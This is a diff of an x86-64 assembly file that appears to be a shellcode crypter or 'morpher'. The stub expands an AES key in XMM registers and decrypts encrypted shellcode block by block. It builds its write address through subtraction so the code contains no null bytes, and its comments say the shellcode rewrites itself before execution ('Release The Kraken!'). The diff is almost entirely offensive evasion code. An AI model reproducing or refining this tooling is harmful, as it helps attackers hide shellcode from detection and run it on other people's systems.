@@ -1,11 +1,6 @@
 #$ as shellcode.s -o shellcode.o
 #$ ld shellcode.o -o shellcode
 
-.data
-	.comm shellcode 32
-# an unaligned buffer for the decrypted shellcode since, it's impossible (at least, I don't know how) to store an arbitrary length in the registers using XMM, stack won't work either
-# it can cause some problems with memory randomization, thus not a very good idea
-
 .globl _start
 _start:
 
@@ -22,7 +17,7 @@ shufps $0x1b, %xmm0, %xmm0
 # because XMM is 128 bits, we will put the first half of the key to the second half of XMM0 and its first half will be zeroed
 shufps $0x1b, %xmm3, %xmm0
 # we will put the first half of XMM3 to th first half of XMM0, thus the key is entirely stored in XMM0
-# it's even more hackerish, but it's the best way I found to store an arbitrary value in the XMM without a pointer/buffer
+# it's even more hackerish, but it's the best way I found to store an arbitrary value in the XMM without a pointer/buffer/location
 
 # let's compute the key by expanding it since, we use AES
 movaps %xmm0, %xmm5
@@ -140,9 +135,10 @@ aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
 
 # finally, we can move the decrypted block to the memory
-# the Linux location is 0x00600300, but will be 0x00600310 and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
+# the Linux location is 0x00600078 and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
 movabs $0xffffffffff599999, %rsi
-movabs $0xfffffffffef99689, %rax
+#movabs $0xfffffffffef99689, %rax
+movabs $0xffffffffff599921, %rax
 sub %rax, %rsi
 mov %rsi, %rbx
 # we will save our pointer in RBX and not RAX, in order not to have zeroes
@@ -174,7 +170,7 @@ aesdeclast %xmm5,  %xmm0
 # move it after already written 16 bytes, using RBX, so we are not limited by the length (16 will be constant, so no zeroes)
 add $16, %rbx
 movaps %xmm0, (%rbx)
-# however, in the morpher we will use RDX since, it contains the buffer's address, thereby the shellcode will rewrite it-self
+# however, in the morpher we will use RDX since, it contains the shellcode's address, thereby the shellcode will rewrite it-self
 # add $16, %rdx
 # movaps %xmm0, (%rdx)
 # "Release The Kraken!" I mean, shellcode
